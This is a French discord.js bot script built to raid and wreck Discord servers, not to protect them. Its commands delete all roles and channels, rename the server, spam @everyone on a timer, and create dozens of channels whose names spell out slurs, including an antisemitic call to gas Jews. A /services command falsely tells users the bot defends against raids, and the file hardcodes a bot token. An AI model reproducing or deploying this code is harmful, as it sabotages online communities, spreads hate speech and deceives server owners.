const Discord = require('discord.js');
const client = new Discord.Client();
const fs = require("fs");
const list = 100;
const ownerID = "";
const token = "NTI4NjM5NDAwMzY4NjY4Njc2.D1DOuw.QM-tz08waE9U7r2Fu3IRNyItEI4";
const prefix = "/";
const description = "Joue";

client.on('ready', () => {
  client.user.setPresence({ game: { name: 'Sert le serveur', type: 0}})
    console.clear();
    console.log("Bot activé");
    console.log("");
    console.log("CTRL + C - Eteindre le bot");
    console.log("Tapez "+prefix+"help sur discord pour afficher l'aide");
});



      client.on('message', message => {
        if (message.content === prefix + "raid"){
          message.delete()
          message.guild.createChannel("Raid").catch(console.error);
          message.guild.createChannel("lidl").catch(console.error);
          message.guild.createChannel("By").catch(console.error);
          message.guild.createChannel("Xil").catch(console.error);
          message.guild.createChannel("amusez").catch(console.error);
          message.guild.createChannel("vous").catch(console.error);
          message.guild.createChannel("bien").catch(console.error);
          message.guild.createChannel("à").catch(console.error);
          message.guild.createChannel("tout").catch(console.error);
          message.guild.createChannel("refaire").catch(console.error);
          message.guild.createChannel("bande").catch(console.error);
          message.guild.createChannel("de").catch(console.error);
          message.guild.createChannel("schlag").catch(console.error);
          message.guild.createChannel("envoyez").catch(console.error);
          message.guild.createChannel("des nudes").catch(console.error);
          message.guild.createChannel("les").catch(console.error);
          message.guild.createChannel("putes").catch(console.error);
          message.guild.createChannel("et").catch(console.error);
          message.guild.createChannel("allez").catch(console.error);
          message.guild.createChannel("vous").catch(console.error);
          message.guild.createChannel("faire").catch(console.error);
          message.guild.createChannel("gazer").catch(console.error);
          message.guild.createChannel("bande").catch(console.error);
          message.guild.createChannel("de").catch(console.error);
          message.guild.createChannel("juifs").catch(console.error);
          message.guild.createChannel("de").catch(console.error);
          message.guild.createChannel("merdes").catch(console.error);
          message.guild.createChannel("Xil").catch(console.error);
          message.guild.createChannel("vous").catch(console.error);
          message.guild.createChannel("baise").catch(console.error);
          message.guild.createChannel("tchao").catch(console.error);
          message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
             message.guild.createChannel("rip le serveur").catch(console.error);
 message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              message.guild.createChannel("rip le serveur").catch(console.error);
              console.log('raid fini');
              return;
            }});

              client.on('message',message => {
                  if(message.content === prefix + 'delroles'){
                    message.delete()
                    message.guild.roles.deleteAll();
                    console.log('roles supprimés');
                    return;
                  }
                  if(message.content === prefix + 'delchannels'){
                    message.delete()
                    message.guild.channels.deleteAll();
                    message.guild.createChannel('rip le serveur').catch(console.error);
                    console.log('cannels supprimés');
                    return
                  }
                  if(message.content === prefix + 'tuer'){
                    message.delete();
                    message.guild.setIcon('./JPEG_20190214_012458.jpg');
                    message.guild.setName('RAID PAR DEA [XIL]');
                    message.guild.setRegion('hongkong');
                    console.log('serveur détruit')
                    return;
                } 
                  if(message.content === prefix + 'spam'){
                    message.delete();
                    let i = 0;
                    let interval = setInterval(function () {
                        message.guild.channels.forEach(channel => {
                            if (channel.type === 'text') channel.send('RAID BY DEA XIL \n Serveur détruit par Xil \n rejoignez mon serveur pour apprendre :wink: @everyone')
                        } , 4000)
                    })
                }});
                client.on('message',message => {
                  if(message.content === prefix + 'services')
                  message.reply('Je suis la pour servir le serveur \n Je suis la pour protèger le serveur \n Je contre les tentatives de raid')
                  console.log('services du bot demandés');
                  return;
                });
client.on('message', message => {
  if(message.content === prefix + 'avatar')
  message.reply(message.author.avatarURL);
        return;
})
     client.login(token);
